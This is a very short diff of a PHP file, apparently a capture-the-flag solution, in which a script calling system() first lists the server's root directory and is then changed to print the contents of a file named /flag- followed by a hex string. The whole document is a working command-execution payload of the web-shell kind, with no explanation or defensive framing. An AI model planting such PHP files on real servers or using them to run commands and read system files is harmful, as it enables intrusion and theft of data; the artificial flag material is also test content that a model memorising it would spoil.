@@ -1,5 +1,5 @@
 <?php
 
 
-echo system("ls /");
+echo system("cat /flag-a410adb35ec243539173d0c03f4f755b");
 ?>
